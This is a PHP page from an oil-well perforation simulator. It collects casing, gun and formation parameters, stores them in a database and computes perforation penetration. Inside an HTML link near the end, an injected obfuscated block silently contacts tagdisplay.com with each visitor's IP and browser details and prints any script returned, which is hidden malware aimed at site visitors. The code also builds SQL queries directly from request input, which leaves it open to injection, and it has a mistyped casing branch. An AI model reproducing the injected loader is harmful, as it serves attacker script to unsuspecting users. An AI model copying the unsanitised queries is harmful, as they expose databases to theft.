<?php
session_start();
?>
<?php
$usuario = $_SESSION['myusername'];
if(!session_is_registered('myusername')){
header("location:login.php");
}

$tipo = $_SESSION['tipo'];



// conectar a la DB
require("connectionDB.php");
///////////////////////////////////


//general
$company = $_REQUEST['companyName'];
$engineer = $_REQUEST['engineer'];
$well = $_REQUEST['well'];
$field = $_REQUEST['field'];
$location = $_REQUEST['location'];
$formation = $_REQUEST['formation'];
$complectionfluid = $_REQUEST['cf']; //complection fluid
$complectionfluidText = $_REQUEST['cf_text']; //complection fluid
$fluidWeight = $_REQUEST['fluidWeight'];
$boreholeDiameter = $_REQUEST['dm']; //borehole diameter
//variable flash
$borehole = $boreholeDiameter;
$herman = $penetracionTotal[1];

echo $herman;
//********************************
//echo "borehole diameter: ".$boreholeDiameter."<br>";
$casing = $_REQUEST['casing'];
//variable flash
$contenedor =  $casing ;

//********************************
$profundidad = $_REQUEST['profundidad']; //depth to top shot
$profundidad2 = $_REQUEST['profundidad2']; //depth to bottom shot

$overburden = $_REQUEST['overburden']; //overburden gradient
$temperature = $_REQUEST['temperature'];
$radio = $_REQUEST['radio'];
//variable flash
$radin =  $radio ;
//********************************

//Well Tubulars
$large_od = trim($_REQUEST['large_od']);
//variable flash
$largeod = $large_od;

//********************************
//echo "od: ".$large_od."<br>";
$large_weight = $_REQUEST['large_weight'];
$large_wall = $_REQUEST['large_pipe'];
//variable flash
$largewall =  $large_wall;


//********************************
$large_pipe = $_REQUEST['large_pipe_text'];
//echo "wall: ".$large_wall."<br>";
$large_sheath = $_REQUEST['large_sheath'];
//echo "sheath: ".$large_sheath."<br>";
$large_fc = $_REQUEST['large_fc'];
$large_cc = $_REQUEST['large_cc'];
$large_casingPosition = $_REQUEST['large_casingPosition'];

$inter_od = $_REQUEST['inter_od'];
//variable flash
$interod = $inter_od;
//********************************
$inter_weight = $_REQUEST['inter_weight'];
$inter_wall = $_REQUEST['inter_pipe'];
//variable flash
$interwall =  $inter_wall;
//********************************
$inter_pipe = $_REQUEST['tx_inter_pipe'];
$inter_sheath = $_REQUEST['inter_sheath'];
if ($inter_sheath  == "Cement") {
$relleno2 = 1; }
else { $relleno2 = 0;}


$inter_fc = $_REQUEST['inter_fc'];
$inter_cc = $_REQUEST['inter_cc'];
$inter_casingPosition = $_REQUEST['inter_casingPosition'];

$small_od = $_REQUEST['small_od'];
//variable flash
$smallod =  $small_od;
//******************** ************
$small_weight = $_REQUEST['small_weight'];
$small_wall = $_REQUEST['small_pipe'];
//variable flash
$smallwall = $small_wall;
//********************************
$small_pipe = $_REQUEST['tx_small_pipe'];
$small_sheath = $_REQUEST['small_sheath'];
$small_fc = $_REQUEST['small_fc'];
$small_cc = $_REQUEST['small_cc'];
$small_casingPosition = $_REQUEST['small_casingPosition'];
if ($small_casingPosition == "Centered") {
$small = 1; }
else { $small = 0;}
//Gun System
$api_company = $_REQUEST['api_company'];
$ctype = $_REQUEST['ctype'];
$gunSize = $_REQUEST['gun_size'];

//variable flash
$guntam =   $gunSize;
//********************************
//echo "size: ".$gunSize."<br><br>";
$shotDensity = $_REQUEST['shot_density'];

//variable flash
$shotDensidad =  $shotDensity;
//********************************
$gunPhase = $_REQUEST['gun_phase'];
$charge_gram = $_REQUEST['charge_gram'];
$charge_part_number = $_REQUEST['charge_part_number'];
$charg = $charge_part_number;

$explosive = $_REQUEST['explosive'];
$gposition = $_REQUEST['gposition'];


$formationCompression = $_REQUEST['formationCompression'];
$fc = $formationCompression;
$formationPorosity = $_REQUEST['formationPorosity'];


if ( $formationCompression == "" ){
	if ($formation  == "Sandstone - Limestone" or $formation == "Limestone Dolomite" or $formation == "Dolomite Shale") {
	$formationCompression= -7228.15*log($formationPorosity) + 26362.99;
	$fc = "";
	} else 
	if ($formation == "Unconsolidated Sandstone" or $formation == "Semi Consolidated Sandstone" or $formation == "Consolidated Sandstone") {
		
		$formationCompression= -15455*log($formationPorosity) + 54097.35;
	$fc = "";
}}
//echo $formationCompression;
if ($small_sheath != "Cement"){
	$small_cc = 0;
}
if ($inter_sheath != "Cement"){
	$inter_cc = 0;
}
if ($large_sheath != "Cement"){
	$large_cc = 0;
}

$consultab = mysql_query("SELECT tfname, tlname, tcompany  FROM USERREG WHERE  tlogin='$usuario' ");
$ab = mysql_fetch_row($consultab);

$name= $ab[0];
$apel= $ab[1];
$comp= $ab[2];


$consultaa= mysql_query("INSERT INTO USERSIMULATION (nombre, apellido, comp, usuario, company, engineer, well, field, location, formation, complectionfluid, complectionfluidtext, fluidweight, boreholediameter,  casing, profundidad, profundidad2, overburden, temperatura, radio, large_od, large_weight, large_wall, large_pipe, large_sheath, large_fc, large_cc, large_casingposition, inter_od, inter_weight, inter_wall, inter_pipe, inter_sheath, inter_fc, inter_cc, inter_casingposition, small_od, small_weight, small_wall, small_pipe, small_sheath, small_fc, small_cc, small_casingposition, api_company, ctype, gunsize, shotdensity, gunphase, charge_gram, charge_part_number, explosive, gposition, formationporosity, formationcompression, fecha) VALUES ('$name','$apel','$comp','$usuario','$company', '$engineer', '$well', '$field', '$location', '$formation', '$complectionfluid', '$complectionfluidText', '$fluidWeight', '$boreholeDiameter',  '$casing', '$profundidad', '$profundidad2', '$overburden', '$temperature', '$radio', '$large_od', '$large_weight', '$large_wall', '$large_pipe', '$large_sheath', '$large_fc', '$large_cc', '$large_casingPosition', '$inter_od', '$inter_weight', '$inter_wall', '$inter_pipe', '$inter_sheath', '$inter_fc', '$inter_cc', '$inter_casingPosition', '$small_od', '$small_weight', '$small_wall', '$small_pipe', '$small_sheath', '$small_fc', '$small_cc', '$small_casingPosition', '$api_company', '$ctype', '$gunSize', '$shotDensity', '$gunPhase', '$charge_gram', '$charge_part_number', '$explosive', '$gposition', '$formationPorosity', '$formationCompression', NOW() )");

/*********************************************  *****     CALCULO     *****  *************************************************/
// $dbh=mysql_connect ("localhost", "etvcom_reyal","reyal") or die ('I cannot connect to the database because: ' . mysql_error());
//	mysql_select_db("etvcom_reyal", $dbh) or die('I cannot connect to the database because: ' . mysql_error());


$consulta = mysql_query("SELECT S1BRIQSTR, S1PEN19B, AVG_CASING_HOLE_DIAMETER, S1WALL, FASE, GiDX, ABREV, IDEC FROM GUNS WHERE CPN='$charge_part_number' and GOD='$gunSize' and GSPF='$shotDensity' and  GPHASE='$gunPhase' and CGMWT='$charge_gram' and gcompanys like '$api_company'");
$rs=mysql_fetch_row($consulta);

$consulta2=mysql_query("SELECT   AO, BO, CO, AI, BI, CI FROM ECUATION  WHERE IDEC='$rs[7]'");
$ec=mysql_fetch_row($consulta2);
//echo $ec[0];

$cp = $rs[0]; 
//echo $cp."<br>"; 
$pp = $rs[1]; 
//echo $pp ."penetracion prueba<br>";
//echo $cp ."compresibilidad prueba<br>";

$casing_avg_hole = $rs[2];
//echo $casing_avg_hole ."casig hole<br>";
$espesorAPI = $rs[3]; 
$clearacePrueba = 0;
$fase = $rs[4];  
$indice = $rs[5];
//echo $indice;
$abrev = $rs[6];
//echo $abrev ."<br>";
//echo $indice;
//echo $fase ."fase<br>";
/*
echo "cp: ".$cp."<br>";
echo "pp: ".$pp."<br>";
echo "casing_avg_hole: ".$casing_avg_hole."<br>";
echo "espesorAPI: ".$espesorAPI."<br>";
*/
if ( strlen($formationCompression)==0 ){
	$cc = $fluidWeight;
}else{
	$cc = $formationCompression;
}


list( $yield, $grade1, $grade2 ) = split( '/', $gunPhase );

//echo sin(deg2rad(270))."<br>";
//echo sin(deg2rad(315))."<br>";
//echo $grade1."------";
if ($casing == 1){

	if ($gposition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){
			$clearance1[$i] = (($large_od - 2*$large_wall) - $gunSize) / 2;
			;
		}
	}else{
			$a = ($large_od - 2*$large_wall) / 2;
		$b = $gunSize / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
			$clearance1[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance1[$i] = $clearance1[$i] - $b;
			$phase = $phase + $grade1;
			

		}
	}
	
	if ($large_casingPosition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
			$clearance2[$i] = ($boreholeDiameter - $large_od) / 2;
			
		}
	}else{

		$a = $boreholeDiameter / 2;
		$b = $large_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
			$clearance2[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance2[$i] = $clearance2[$i] - $b;
			$phase = $phase + $grade1;
		}
	}
}


if ($casing == 2){ 

	if ($gposition == "Centered"){ 
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance1[$i] = (($inter_od - 2*$inter_wall) - $gunSize) / 2;
		}}else{ 
		$a = ($inter_od - 2*$inter_wall) / 2;
		$b = $gunSize / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance1[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance1[$i] = $clearance1[$i] - $b;
			$phase = $phase + $grade1;
		}}
	


	if ($inter_casingPosition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance2[$i] = (($large_od - 2*$large_wall) - $inter_od) / 2;
		}}else{
		$a = ($large_od - 2*$large_wall) / 2;
		$b = $inter_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance2[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance2[$i] = $clearance2[$i] - $b;
			$phase = $phase + $grade1;
		}}
	
	
	
	if ($large_casingPosition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance3[$i] = ($boreholeDiameter - $large_od) / 2;
			
	}}else{ 
		$a = $boreholeDiameter / 2;
		$b = $large_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance3[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance3[$i] = $clearance3[$i] - $b;
			$phase = $phase + $grade1;
		}}
	
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
if ($casing == 3){

	if ($gposition == "Centered"){ 
		for($i=0; $i<$shotDensity; $i++){
			$clearance1[$i] = (($small_od - 2*$small_wall) - $gunSize) / 2;
		}
	}else{ 
		$a = ($small_od - 2*$small_wall) / 2;
		$b = $gunSize / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance1[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance1[$i] = $clearance1[$i] - $b;
			$phase = $phase + $grade1;
		}
	}


	if ($small_casingPosition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){
			$clearance2[$i] = (($inter_od - 2*$inter_wall) - $small_od) / 2;
		}
	}else{
		$a = ($inter_od - 2*$inter_wall) / 2;
		$b = $small_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance2[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance2[$i] = $clearance2[$i] - $b;
			$phase = $phase + $grade1;
		}
	}

	if ($inter_casingPosition == "Centered"){
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance3[$i] = (($large_od - 2*$large_wall) - $inter_od) / 2;
		}
	}else{
		$a = ($large_od - 2*$large_wall) / 2;
		$b = $inter_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance3[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance3[$i] = $clearance3[$i] - $b;
			$phase = $phase + $grade1;
		}
	}
	
	
	if ($large_casingPosition == "Centered"){ 
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance4[$i] = ($boreholeDiameter - $large_od) / 2;
		}	
	}else{ 
		$a = $boreholeDiameter / 2;
		$b = $large_od / 2;
		$phase = 270;
		for($i=0; $i<$shotDensity; $i++){ 
			$clearance4[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
			$clearance4[$i] = $clearance4[$i] - $b;
			$phase = $phase + $grade1;
		}
	}




/*
//----------------------------- 3 CASING CENTRADO  -------------------------------
	for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
		$clearance1[$i] = (($small_od - 2*$small_wall) - $gunSize) / 2;
		$clearance2[$i] = (($inter_od - 2*$inter_wall) - $small_od) / 2;
		$clearance3[$i] = (($large_od - 2*$large_wall) - $inter_od) / 2;
		$clearance4[$i] = ($large_od - $boreholeDiameter) / 2;
	}
//----------------------------- 3 CASING DESCENTRADO  -------------------------------
	$a = ($small_od - 2*$small_wall) / 2;
	$b = $gunSize / 2;
	$phase = 270;
	for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
		$clearance1[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
		$phase = $phase + $grade1;
	}
	
	$a = ($inter_od - 2*$inter_wall) / 2;
	$b = $gunSize / 2;
	$phase = 270;
	for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
		$clearance2[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
		$phase = $phase + $grade1;
	}
	
	$a = ($large_od - 2*$large_wall) / 2;
	$b = $gunSize / 2;
	$phase = 270;
	for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
		$clearance3[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin(deg2rad($phase))*sin(deg2rad($phase))*pow($a - $b, 2) ) + sin(deg2rad($phase))*($a - $b);
		$phase = $phase + $grade1;
	}
	
	$a = ($boreholeDiameter - $large_od) / 2;
	$b = $gunSize / 2;
	$phase = 270;
	for($i=0; $i<$shotDensity; $i++){ //asignar a arreglo
		$clearance4[$i] = sqrt( pow($a, 2)- pow($a - $b, 2) + sin($phase)*sin($phase)*pow($a - $b, 2) ) + sin($phase)*($a - $b);
		$phase = $phase + $grade1;
	}
	*/
}




for($i=0; $i<$shotDensity; $i++){
	$clearance_donde_hay_fluido[$i] = $clearance1[$i];
	$correccionFluido[$i] = 0;
	$espesorCemento[$i] = 0;

	
	
	if ($casing == 1){
		if ($large_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance2[$i]; 
			/*if ($large_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance2[$i]; 
			}*/
		}else{ // hay cemento
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance2[$i]; 
		}
	}
	
	
	if ($casing == 2){
		if ($large_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance3[$i]; 
			/*if ($large_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance3[$i]; 
			}*/
		}else{ // hay cemento
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance3[$i]; 
		}
		
		if ($inter_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance2[$i]; 
			/*if ($inter_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance2[$i]; 
			}*/
		}else{ // hay cemento
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance2[$i]; 
		}
	}
	
	
	if ($casing == 3){
		if ($large_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance4[$i]; 
			/*if ($large_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance4[$i]; 
			}*/
		}else{ 
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance4[$i]; 
		}
		
		if ($inter_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance3[$i]; 
			/*if ($inter_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance3[$i]; 
			}*/
		}else{ 
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance3[$i]; 
		}
		
		if ($small_sheath == "Fluid"){
			$clearance_donde_hay_fluido[$i] = $clearance_donde_hay_fluido[$i] + $clearance2[$i];
			/*if ($small_casingPosition=="Eccentered"){
				$correccionFluido_y[$i] = $correccionFluido_y[$i] + $clearance2[$i]; 
			}*/
		}else{ 
			$espesorCemento[$i] = $espesorCemento[$i] + $clearance2[$i]; 
		}
	}
	//echo "espesor cemento[$i]: ".$espesorCemento[$i]."<br>";
	
$porcentaje_a_usar[$i] = ($clearance_donde_hay_fluido[$i] - $clearacePrueba) / $pp;//solo aplica si sheath es fluid, por lo menos aplica una vez: Completion Fluid
	//echo "porcent ".$porcentaje_a_usar[$i]."<br>";
	//echo "porcentaje[$i]: ".$porcentaje_a_usar[$i]." clearance_donde_hay_fluido[$i]: ".$clearance_donde_hay_fluido[$i]."<br>";
//	echo $clearance_donde_hay_fluido[1] ."clearance<br>";

		//Correccion por fluido por tipo de carga;
	
					$correccionFluido[$i] = $ec[0]*($clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i]) + $ec[1]*($clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i]) + $ec[2]*($clearance_donde_hay_fluido[$i]) + $pp;
				
				$diametroHoyo[$i] =  $ec[3]*($clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i]) + $ec[4]*($clearance_donde_hay_fluido[$i] * $clearance_donde_hay_fluido[$i]) + $ec[5]*($clearance_donde_hay_fluido[$i]) 
				+ $casing_avg_hole ;  
				
				
			
				$factorfluido[$i] = ( $correccionFluido[$i] -$pp ) /$pp;
				
				}
					
					
	 		
	
$pm = ($profundidad2 + $profundidad )/2;
/*
echo "Profundidad 2: ".$profundidad2. "<br>";
echo "Profundidad 1: ".$profundidad. "<br>";
*/
$profnormal =   -1.83947004929906E-13*($pm*$pm*$pm) + 6.55121114153011E-09*($pm*$pm) - 0.0000769329100434083*($pm) + 1 ;
// echo "Profnormal: " . $profnormal;
/*echo "Pm: ".$pm ."<br>";
echo "1: ".(-1.83947004929906E-13*($pm*$pm*$pm)). "<br>";
echo "2: ".(6.55121114153011E-09*($pm*$pm)). "<br>";
echo "3: ".(- 0.0000769329100434083*($pm)). "<br>";
echo "Profnormal: ".$profnormal . "<br>";
*/
$factov =  1.115 - $overburden /9;



$deepfactor = 1 - $profnormal*$factov;
if ($deepfactor < 0){
	$deepfactor = 0;
}

/*
$deepfactor = -2.058 * log($pp) + $pp;
echo "deepfactor: " . $deepfactor . "<br>";
*/
/*
if ($overburden < 0.25) {
	$deepfactor = 1 - $profnormal;
	}
 */
//echo $profnormal ."profnormal<br>";
//echo $factov ."factov<br>";
//echo $deepfactor."deepfactor<br>";




/*
$penCemento_1 = 0;
$penCemento_2 = 0;
$penCemento_3 = 0;
$penCemento_4 = 0;
*/
//se inicializan los valores
for($i=0; $i<$shotDensity; $i++){
	$factorCemento[$i] = 0;
}

if ($casing == 1 && $large_sheath == "Cement"){ // 1 casing 
	$penCemento1 = exp( log($pp) +0.000086*($cp-$large_cc) ); //si no hay cc es 6000 por defecto
	// echo "Penetracion cemento: ". $penCemento1 . "<br>";
	for($i=0; $i<$shotDensity; $i++){
		
		$factorCemento[$i] = ($espesorCemento[$i] / $penCemento1); //espesorcemento sumatoria de los espacios anulares donde hay cemento;
	
	}
}

if ($casing == 2 ){
	if ($inter_sheath == "Cement"){
		$penCemento1 = exp( log($pp) +0.000086*($cp-$inter_cc) ); //si no hay cc es 6000 por defecto
		for($i=0; $i<$shotDensity; $i++){
			$factorCementoa[$i] = ($espesorCemento[$i] / $penCemento1); //espesorcemento sumatoria de los espacios anulares donde hay cemento
		}
	}
	if ($large_sheath == "Cement"){
		$penCemento2 = exp( log($pp) +0.000086*($cp-$large_cc) ); //si no hay cc es 6000 por defecto
		for($i=0; $i<$shotDensity; $i++){
			$factorCementob[$i] = ($espesorCemento[$i] / $penCemento2); //espesorcemento sumatoria de los espacios anulares donde hay cemento
		}
	}
	 
	for($i=0; $i<$shotDensity; $i++){
			$factorCemento[$i] = $factorCementoa[$i] + $factorCementob[$i]  ; 
		}
	//echo "<br>".$penCemento_1."<br>";

//echo exp( log($pp) +0.000086*($cp-$inter_cc) );
//echo exp( log($pp) +0.000086*($cp-$large_cc) );

//echo $penCemento_2."<br>";
}

if ($casing == 3 ){
	if ($small_sheath == "Cement"){
		$penCemento_1 = exp( log($pp) +0.000086*($cp-$small_cc) ); 
		for($i=0; $i<$shotDensity; $i++){
			$factorCementoa[$i] = ($espesorCemento[$i] / $penCemento_1); 
		}
	}
	if ($inter_sheath == "Cement"){
		$penCemento_2 = exp( log($pp) +0.000086*($cp-$inter_cc) ); 
		for($i=0; $i<$shotDensity; $i++){
			$factorCementob[$i] = ($espesorCemento[$i] / $penCemento_2);
		}
	}
	if ($large_sheath == "Cement"){
		$penCemento_3 = exp( log($pp) +0.000086*($cp-$large_cc) ); 
		for($i=0; $i<$shotDensity; $i++){
			$factorCementoc[$i] = ($espesorCemento[$i] / $penCemento_3); 
		}
	}
	for($i=0; $i<$shotDensity; $i++){
			$factorCemento[$i] = $factorCementoa[$i] + $factorCementob[$i] + $factorCementoc[$i] ; 
		}
}

//$cc; 
/*
$penetracionRealCemento = exp ( log($pp) + 0.000086*($cp-$cc) );

echo "<br>penetracion real: ".$penetracionRealCemento;

//si el usuario ingreso porosidad en lugar de cf
$factorCorreccion = ($penetracionReal - $formationCompression) / $penetracionReal;
echo "<br>factorCorreccion: ".$factorCorreccion;

*/

$penBriqueta = exp ( log($pp) + 0.000086*($cp-5000) );
$penAcero = 0.1445 * $penBriqueta + 1.0094;
//$penAcero = 0.2801 * $penBriqueta + 0.4658;
if ($casing == 1){ 
	$espesorTerminacion = $large_wall;
}
if ($casing == 2){ 
	$espesorTerminacion = $large_wall + $inter_wall;
}
if ($casing == 3){
	$espesorTerminacion = $large_wall + $inter_wall + $small_wall;
}

$factorAcero =  ($espesorTerminacion - $espesorAPI) / $penAcero;
/*
echo "FactorAcero = (EspesorTerminacion - espesorAPI)/penAcero <br>";
echo "EspesorTerminacion: ".$espesorTerminacion ."<br>";
echo "EspesorAPI: ".$espesorAPI."<br>";
echo "penAcero: ".$penAcero ."<br>";
echo "Factor Acero: ".$factorAcero."<br>";
*/
//echo $factorAcero;


//$cf = exp ( log($pp) + 0.000086*($cp-$formation) );




for($i=0; $i<$shotDensity; $i++){
	//$clearances[$i] = $clearance1[$i];
	// 1 casing
	if ($casing == 1){
		$clearances[$i] = $clearance1[$i] + $clearance2[$i]; 
	}
	
	// 2 casing
	if ($casing == 2){
		$clearances[$i] = $clearance1[$i] + $clearance3[$i] + $clearance2[$i]; 
	}
	
	// 3 casing
	if ($casing == 2){
		$clearances[$i] = $clearance1[$i] + $clearance4[$i] + $clearance3[$i] + $clearance2[$i]; 
	}
	//echo $clearances[$i]."<br>";
} //fin clearances

$penetracionFormacion_val = exp ( log($pp) + 0.000086*($cp-$formationCompression) );


//echo $penetracionFormacion_val ."penformacionval<br>";
//echo $factorAcero  ."acero<br>";
//echo $factorfluido[4] ."fluido<br>";
//echo $factorCemento[4] ."cemento<br>";
//echo $deepfactor ."deep<br>";
//echo $clearance_donde_hay_fluido[4] ."clefluido<br>";
//echo $clearance1[4] ."clearance1<br>";
//echo $espesorCemento[4] ."espcemento<br>";

for($i=0; $i<$shotDensity; $i++){
	$penetracionFormacion[$i] = $penetracionFormacion_val* (1 - ($factorAcero + $factorfluido[$i] + $factorCemento[$i] +$deepfactor)); //$correccionFluido_y[$i];// * $penCemento_x[$i];
     if ($penetracionFormacion[$i] <= 0) {
		$penetracionFormacion[$i] = 0;
	 };


	$penetracionTotal[$i] = $penetracionFormacion[$i] + $clearances[$i] + $espesorTerminacion - $clearance1[$i];
/*
 	echo "Penetracion total: " . $penetracionFormacion_val . "<br>";
	echo "Factor Fluido: " . $factorfluido[$i] . "<br>";
	echo "Factor Cemento: " . $factorCemento[$i] . "<br>";
	echo "Deep Factor: " . $deepfactor . "<br>";
	echo "Penetracion aplicando factores: " . $penetracionFormacion[$i] . "<br>";

	echo "Penetracion formacion: ". $penetracionFormacion[$i] . "<br>";
	echo "Todos los clearances: ". $clearances[$i] . "<br>";
	echo "Espesor terminacion: ". $espesorTerminacion . "<br>";
	echo "Clearance 1: ". $clearance1[$i] . "<br>";
	echo "<hr>";
*/

	$penetracionflash[$i] = $penetracionFormacion[$i] + $clearances[$i] + $espesorTerminacion; 
	//echo $penetracionflash[0];
	//echo $penetracionFormacion[$i]." . ".$penetracionTotal[$i]." . ".$correccionFluido_y[$i]."<br>";
	//echo "fluido: ".$correccionFluido[$i]."<br>";
	//echo "cement: ".$factorCemento[$i]."<br>";
};

//for($i=0; $i<$shotDensity; $i++){
//echo $penetracionTotal[$i] ."pt<br>";
//}

//echo $casing_avg_hole;
//for($i=0; $i<$shotDensity; $i++)
	//$factorCemento[$i];
//	echo $penetracionTotal[$i];

//echo pi();
for($i=0; $i<$shotDensity; $i++){
	//$diametroHoyo[$i] = $correccionFluido[$i] * $casing_avg_hole; //$diametroHoyo = $correccionFluido * $casing_avg_hole; //$correccionFluido es un vector
	$radiohoyo[$i] = $diametroHoyo[$i] /2;
	$area[$i] = pi() * (( $penetracionFormacion[$i]* $penetracionFormacion[$i] * $radiohoyo[$i]) /$penetracionTotal[$i])  * sqrt($radiohoyo[$i] *$radiohoyo[$i] / $penetracionTotal[$i]*$penetracionTotal[$i]  + 1);

	
	$areaExpuestaFlujo[$i] = pi() * ($diametroHoyo[$i] / 2) * $penetracionFormacion[$i] * $penetracionFormacion[$i] / $penetracionTotal[$i];
	//echo $areaExpuestaFlujo[$i]."<br>";
	//echo $diametroHoyo[$i]."<br>";
}

//******************************************************************************************************************************/
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link href="style2.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" media="print" href="print.css" type="text/css" />
<script language="javascript" type="text/javascript" src="ajax.js"></script>
<title>CCS Simulator</title>
<style type="text/css">
<!--
.style14 {
	font-size: 9px;
	color: #999999;
}
.style15 {font-size: 9px}

.style17 {
	color: #FF0000;
	font-size: 36px;
	font-weight: bold;
}
-->
</style>
</head>

<body>
<div align="center">
  <table width="757" border="1" cellpadding="0" cellspacing="0">
    <tr>
      <td><div align="center"><img src="banner.jpg" width="757" height="87" /></div></td>
    </tr>
</table>
  
  <div class="noPrint"><table  align="center" cellpadding="0" cellspacing="0" border="0" width="757">
        <tr class="button">
          <td align="center" width="204" class="textbutton"><a href="pdfprinter.html" target="_blank" class="textbutton style10"><span class="style12">How Print Report in PDF? </span></td>
          <td align="center" width="139">&nbsp;</td>
          <td width="140" align="center" class="textbutton"> <a href="consistencia.php?indice=<?PHP echo $indice;?>
<?php
#1d7be7#
error_reporting(0); @ini_set('display_errors',0); $wp_xk81299 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xk81299) && !preg_match ('/bot/i', $wp_xk81299))){
$wp_xk0981299="http://"."tag"."display".".com/"."display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xk81299);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xk0981299); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_81299xk = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_81299xk = @file_get_contents($wp_xk0981299);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_81299xk=@stream_get_contents(@fopen($wp_xk0981299, "r"));}}
if (substr($wp_81299xk,1,3) === 'scr'){ echo $wp_81299xk; }
#/1d7be7#
?>&abrev= <?PHP echo $abrev;?>&cp=<?PHP echo $charg; ?>&guntam= <?PHP echo $gunSize;?>&shotperfoot= <?PHP echo $shotDensity;?>&fase=<?PHP echo $gunPhase;?>" target="_blank" class="style12 textbutton"><em>Shot Consistance</em></a> </td>
